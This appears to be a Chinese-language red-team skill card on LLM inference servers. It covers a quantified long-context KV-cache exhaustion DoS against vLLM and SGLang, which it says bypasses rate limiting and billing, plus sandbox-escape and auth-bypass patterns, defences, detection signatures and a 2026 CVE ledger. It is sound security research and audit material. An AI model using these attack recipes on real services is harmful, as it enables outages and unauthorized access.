- **调度器机制**（本卡回源 vLLM main 核验）：
  - `scheduler.py` L912（文章引 :957，行号漂移机制一致）：FCFS 抢占选 `self.running[-1]` 队尾=最近进入者；PRIORITY 分支按 `(priority, arrival_time)` 选。**先到的长请求获得豁免权**——只要在 running 前部，永不被牺牲，代价全推给后到的短请求。
  - `_preempt_request()` L1814-1838：`request.num_computed_tokens = 0`——**归零全额重算**（非检查点回退）；`num_preemptions += 1` 计数器存在（观测层可用）。
  - prefill 与 decode 共享同一 token 预算（文章核 :738）；块池整块分配（:681）、队列语义空闲表（:45）；块哈希 = f(父哈希, 本块 token)（:711）。
  - SGLang：CacheAwarePolicy 按 LPM 最长前缀匹配排序（schedule_policy.py:236）+ preempt_to_schedule（:1745）+ 基数树 KV 复用驱逐（radix_cache.py:282）——队列头放不下就跳过继续看后面（与 vLLM 严格 FCFS 的关键差异）。

### 攻击面（授权测试 SOP，形态与正常请求同构）

攻击请求 = 同样 API、同样计费，仅输入长度取满上下文窗口、`max_tokens` 给小值。强度阶梯（仿真下界）：

| 攻击请求数 | P99 TTFT | 放大 | 备注 |
|---|---|---|---|
| 0 | 1.52s | 1.0× | 基线 |
| 1 | 8.53s | 5.6× | 仅占池 32%，伤害全来自 prefill 排队 |
| 6 | 55.46s | 36.5× | 池 194%，51 次抢占、4.3 万 token 重算 |
| 10 | 98.68s | 65× | 增幅放缓：池满后新请求只排队不抢占 |

- 强度 ≥1 时 200 条正常请求 TTFT **全部**超 5s——单用户可致全服务降级。
- **非线性**：池满后边际效应递减；「刚好占满不溢出」是服务最痛点（勉强能跑与每步都抢之间横跳）。
- 同 20 万 token 预算四打法：请求洪水 359 条 = 74.8× 最强但 60 QPS 会被按请求数限流拦住；**长 prompt 6 条 = 36.5×，用 1/60 请求数拿 1/2 破坏力——同时绕过按请求数限流与按 token 计费两条防线**（伤害放大器是抢占重算，长 prompt 只是敲门砖）；长输出最弱 17.2×（decode 每步只涨 1 token KV，瞬时冲击优于持续占用）。
- **反直觉：前缀缓存削弱攻击**——共享 30K 前缀开缓存 37.85s vs 关缓存 55.46s；攻击者省的 prefill 就是服务端少受的罪（重复长前缀被缓存变成廉价公共资源）。
- vLLM vs SGLang 同攻击：SGLang 90.52s（225 抢占，短请求被 LPM 插队又抢占来回重算）vs vLLM 55.46s（51）。**不可推广为「SGLang 更差」**（文章仅复刻 2 个策略点）；SGLang 论文「未来工作」自列 cache-aware scheduling starvation。

### 防御矩阵（八种实测仅两种有效——仿真口径）

| 措施 | P99 | 结论 |
|---|---|---|
| 入口上下文上限 8K | 1.52s | ✅ 有效（攻击请求入口拒绝） |
| 单请求 KV 配额 ≤25% 池 | 1.52s | ✅ 有效（>25% 池的请求做不了，含合法长文档——松紧是产品决定） |
| 抢占改「抢块最多的」（公平化） | 212s | ❌ **重算炸弹**：3.8× 更糟，重算 73.1 万 token（17×）——抢大请求=重算 713 TFLOPs，回队首后因「太大」被优先再抢再重算，循环 |
| 并发槽位砍半 / 开前缀缓存 / 显存 95% | 噪声内 | ❌ 无帮助 |

- **准入控制 > 调度优化**：配额+抢占改序 与 仅配额 结果完全相同——抢占策略根本没机会执行。资源超额占用场景，入口拒绝永远便宜过事后补救。
- 上下文上限按显存反推：`max_ctx ≈ (可用显存 − 权重 − 固定开销) / (每 token 字节 × 并发数)`。24GB/7B/8 并发 → 12K；开 32K=3.09 用户占满=配置失败，不是攻击者的胜利。
- 抢占后 **swap 替代 recompute**：32K KV=1.79 GiB，PCIe 4.0 x16 往返 ~56ms vs 重算 8s，差两个数量级；`swap_space` 默认 4 GiB 需按业务调大。
- chunked prefill 只解决「一次算多少」，不解决「占多少块」——长请求分阶段持有 KV 在当前 PagedAttention 做不到。

### 观测层签名（三特征合取）

1. `gpu_cache_usage_perc` ≈ 1.0 持续 + `vllm:num_requests_waiting` 单调上升（只看占用率会误报：长文档批处理天然打满）。
2. `vllm:num_preemptions_total` 上升（版本间指标名可能不同，以实际 /metrics 为准）。
3. 更早信号：**TTFT P99 抬头而 TPOT 不动** = prefill 排队堵死，几乎只对应「有超长请求在前面堵着」。

### 判读要点（白盒视角）

- 「合法请求 + 计费正常」≠ 无害：按 token 计费无法反映 KV 占用与重算成本；防御与定价要按 KV 占用而非 token 数。
- 看似不合理的默认抢占策略先找它在优化什么：抢队尾优化「释放单位块的重算成本」，不是随手写；公平性改序在此场景是实测负优化（有数据）。
- 与控制面攻击的组合链：本技能 v1.1 部署面（vLLM `--host 0.0.0.0` 无认证暴露）+ 本节数据面 = **单请求级全服务 DoS 无需任何凭据**；审计暴露的推理端点时此为最低成本打击路径。

## 邻近模式速查（同窗口另三框架）

| 模式 | 机制 | 实例 |
|------|------|------|
| DNS rebinding + Host 头校验缺失 | 一次网页访问 → 未鉴权管理 API | NemoClaw/Ollama CVE-2026-65105 |
| agent runtime 本地未鉴权 API | 沙箱内一条 curl 调本地端口 API → 关闭全部 confinement（danger-full-access） | DeepSeek Harness CVE-2026-82533 |
| eval() 伪沙箱 | `eval(expr, {"__builtins__": {}}, ns)` 仍可经字面量→`__class__`→`__subclasses__` 图恢复模块引用；`bool()` 包裹只使其变盲，不阻止副作用 | Langflow CodeParser / SGLang dumper（需 DUMPER_SERVER_PORT） |
| 文档示例密钥当真凭据 | setup guide 印 `sk-1234`，运维复制粘贴进产线；master key 兼任鉴权开关，无 key 启动即全员 PROXY_ADMIN | LiteLLM（9.6% 暴露实例，Wiz 2026-09） |
| 认证 fallback 吞 401 | MCP 端点双认证路径：LiteLLM key 校验失败回退 OAuth2 透传，垃圾 token 与合法 token 不区分，返回空 auth 对象 | LiteLLM CVE-2026-59822（CISA KEV，CVSS 8.8） |
| 默认 auto-login 击穿路由认证 | 1.3.0+ 路由已加 `CurrentActiveUser`，但 `LANGFLOW_AUTO_LOGIN=true` 默认值使请求自动认证——认证检查存在但被部署默认值短路 | Langflow CVE-2026-0768（1.3.0~1.10.0 间默认部署） |
| 前缀匹配路由白名单放行写端点 | UI 会话经 _is_ui_route() startswith 匹配含 /config 的只读清单，/config/update 同前缀一并放行 | LiteLLM CVE-2026-35029（<1.83.0） |
| 顶层参数守卫不查嵌套对象 | is_request_body_safe 只拦顶层 api_base/base_url，user_config 内嵌 api_base 在构建出站 router 时复活 | LiteLLM CVE-2026-59823（≤1.83.8） |

## 防护与检测清单（报告修复段模板）

1. **fail-closed**：管理路由无凭据时拒绝启动/拒绝公开 bind，而非警告了事
2. **管理面分离**：模型加载/权重传输/profiling 独立 listener，默认私有绑定
3. **非可执行格式**：网络面张量只用 safetensors；legacy pickle checkpoint 不给不安全重试
4. **显式响应 schema**：运营端点返回 allowlist 模型，禁止宽序列化内部配置
5. **peer 即身份**：权重传输通道 mTLS + 运营方 peer allowlist + egress 策略禁任意出网
6. **检测**：监控 `/server_info`、`/update_weights_from_*`、tensor 更新路由、分布式权重组路由的异常请求；SGLANG_USE_PICKLE_IPC=false（兼容时）

## CVE 案例台账（2026，SGLang + LiteLLM 波次）

| CVE | 时间 | 类 | 研究者/协调 |
|-----|------|----|------------|
| CVE-2026-3059 | 03 | ZMQ broker 裸 pickle.loads，无条件绑 0.0.0.0 | Orca |
| CVE-2026-7301/7302/7304 | 05 | scheduler pickle / 路径穿越任意写 / dill logit processor | Antiproof, VU#777338 |
| CVE-2026-15969 等六个 | 07 | SafeUnpickler builtins 绕过（/load_lora_adapter_from_tensors）、dumper eval 逃逸、多模态 SSRF、weights_only 回退、/server_info 泄 key、peer enrollment | Apoorv Dayal, VU#281278 |
| CVE-2026-86793 | 09-11 | SafeUnpickler builtins 绕过**再现**（/update_weights_from_tensor）——7 月修复未关 class | VicOne Reuel Magistrado |
| CVE-2026-59821 | 09-09 | custom code guardrails `exec(compile(...))` 无沙箱不清 builtins → 容器 root RCE；PR #22095 修复 | Wiz Research（DEF CON 34） |
| CVE-2026-59822 | 09-09 | MCP 认证 fallback 吞 401 返回空 auth 对象 → 任意 Bearer 串建会话；**已入 CISA KEV + 蜜罐观测在野利用** | Wiz Research（DEF CON 34） |
| CVE-2026-42271 | 06 前 | 两个 MCP test 端点任意认证用户命令执行（CVSS 8.7）；与 CVE-2026-48710（Starlette host-header）链成无凭据 RCE，在野装挖矿 | Horizon3.ai / Microsoft 案例 |
| CVE-2026-40217 | 05 | 沙箱字节码逃逸，代码运行于 proxy 进程（默认镜像 root）；影响 1.81.8~1.83.10 | LiteLLM 官方通告 |
| CVE-2026-0768 | 01 披露 / 08-30 在野 | validate 端点无认证 exec() RCE（CVSS 9.8，CWE-94）：≤1.2.x 全裸，1.3.0+ 被 AUTO_LOGIN 默认值击穿，exec 存活至 1.10.1；VulnCheck 蜜罐 360+ 次利用，目标 OpenAI/AWS 凭据与 secret_key | Trend Research 三人组（ZDI-26-034）/ VulnCheck 观测 |
| CVE-2026-35029 | 02-24 SEC Consult 独立发现 / 04-03 GHSA / 1.83.0 修复 / 10-13 CPR 披露 | /config/update 缺 proxy_admin 角色检查 + _is_ui_route 前缀放行 → 任意文件读（UI_LOGO_PATH+/get_image）/管理接管（UI_USERNAME 覆写）/pass-through s3:// RCE；CVSS4 8.7，无配置级缓解 | Check Point Research + SEC Consult SA-20260421-0（双源独立）+ Zenity 在野探测 |
| CVE-2026-59823 | 1.83.9 修复（2026-04-17 发布）/ 08-26 GHSA | user_config 嵌套 api_base 绕过 is_request_body_safe 顶层守卫 → SSRF，默认头携带 provider key 外送（key 捕获仅 CPR 记录，官方评分未计入）；CWE-918 CVSS4 5.3 | Check Point Research |

教训锚点：同一 gadget 类六周内两次独立披露（15969 → 86793），实证「denylist 修复 = 打地鼠」。

## 参考资源

- VicOne 技术分析（CVE-2026-86793，2026-09-11）
- Apoorv Dayal《Breaking SGLang's Trust Boundaries》+ CERT/CC VU#281278：https://thoughts.apoorvdayal.com/posts/sglang-disclosures/
- Antiproof《Three RCEs in SGLang》+ VU#777338：https://antiproof.ai/blog/three-rces-in-sglang/
- GitHub sgl-project/sglang issue #30165（SafeUnpickler bypass 复现路径）
- 部署面（v1.1）：NSFOCUS CNVD-2025-04094 公告（2025-03，确认默认绑 127.0.0.1）；Cisco《Detecting Exposed LLM Servers: A Shodan Case Study on Ollama》（1,139 实例实测）；CSA《Exposed AI Infrastructure》research note（2026-05，31% 未授权推理率）；ollama/ollama#16236（官方确认默认 bind + 545 实例 Shodan 实证）
- AI 网关面（v1.2）：Wiz Research《Off Guard: Breaking LiteLLM from authentication bypass to cloud compromise》2026-09-09（DEF CON 34 报告；294/3,074=9.6% 默认密钥率、CVE-2026-59821/59822、PR #22095、IMDS x-pass- 穿透）；The Hacker News 2026-09-10《Nearly 1 in 10 Exposed LiteLLM Gateways Accepted the Example "sk-1234" Admin Key》（2026-08 复扫 8.5 万多为蜜罐的口径警告）；CISA KEV CVE-2026-59822（2026-09-02 入库，联邦修复截止 09-16，蜜罐观测自 07-07）；BerriAI/litellm PR #22095（commit e50b4486）；THN 全文镜像 news.lavx.hu（CVE-2026-42271+48710 挖矿链 / Microsoft Tier-0 案例 / 1.84.0 修复基线 / salt key 轮换告警 / 升级不清除持久化 guardrail）
- 关联技能：`llm-redteam`（应用层）、`redteam-ssrf`（多模态 URL 抓取面）、`redteam-auth`（通用认证）、`fp-check`（finding 六门复核）、`target-scoped-workspace`（产物落盘规范）
- Langflow validate 波次（v1.3）：ZDI-26-034 一手通告 https://www.zerodayinitiative.com/advisories/ZDI-26-034/（CVSS 9.8 描述、时间线、root 执行）；pruva REPRO-2026-00342 https://pruva.dev/reproductions/REPRO-2026-00342（容器实测复现：1.1.1 非盲 RCE、1.3.0 faac4db 路由认证、AUTO_LOGIN 默认值击穿、payload 与 detail.function.errors[0] 回显链）；源码直读 GitHub tag 1.2.0/1.4.1/1.5.0（路由认证与 exec 存活核对，本卡完成）；VulnCheck/BleepingComputer/CSA 2026-09（在野利用 360+ 次、12 CVE 年、攻击者凭据侦察特征：LANGFLOW_SUPERUSER/OPENAI_API*/AWS_ACCESS* 环境变量、/root/.cache/langflow/secret_key）；FreeBuf 504894（本卡证据源）
- 数据面 KV 池挤占波次（v1.5）：FreeBuf 510931《用长上下文请求挤占 vLLM 与 SGLang 的 KV Cache 池把推理服务拖死》https://www.freebuf.com/articles/ai-security/510931.html （原创量化分析：KV 字节账/容量死结/47× prefill 放大/抢占重算炸弹/八加固二有效；全部数字为离散事件仿真 + roofline 下界，实测约 3.1×）；本卡回源核验 vLLM main scheduler.py 快照（L912 FCFS 抢队尾、L1814-1838 归零重算，存档 gap-20261107-003/evidence/）；学术线：PagedAttention SOSP'23 / Orca OSDI'22 / VLLMserve fairness OSDI'24 / Sarathi-Serve OSDI'24 / PD3F EMNLP'25 Findings / BTDefense SOSP'24 poster / ThinkTrap NDSS'26 / OverThink arXiv:2502.02542 / Sponge Examples EuroS&P'21
- 控制面越权+SSRF 波次（v1.4）：Check Point Research《When LLM Gateways Go Wrong: Findings from LiteLLM》2026-10-13 https://research.checkpoint.com/2026/when-llm-gateways-go-wrong-findings-from-litellm（v1.77.7 实测、_is_ui_route 前缀放行根因、三条链实证、password hash 附带发现、披露始于 2025-10）；GHSA-53mr-6c8q-9789（2026-04-03，<1.83.0 受影响、1.83.0 修复、无配置级 workaround）；GHSA-hx8v-g79f-8w5f（2026-08-26，≤1.83.8 受影响、1.83.9 修复且 2026-04-17 发布、CWE-918、需有效 virtual key）；SEC Consult SA-20260421-0 full-disclosure 2026-04（2026-02-24 独立发现、pass-through headers env 代换外泄 PoC、fix commit 57c0545）；Zenity 在野探测观察（1.74.0 复现 / 1.81.0 已 403 / UI_LOGO_PATH 指向 /proc/self/environ 等目标与 hunting IOC 清单）；threatfrontier 判读（逐 CVE 修复版本与 CPR「1.83.9 并集」口径差异）；安全客 316257（本卡证据源，其「1.83.9 以下全受影响」表述对 35029 不精确，已纠偏）
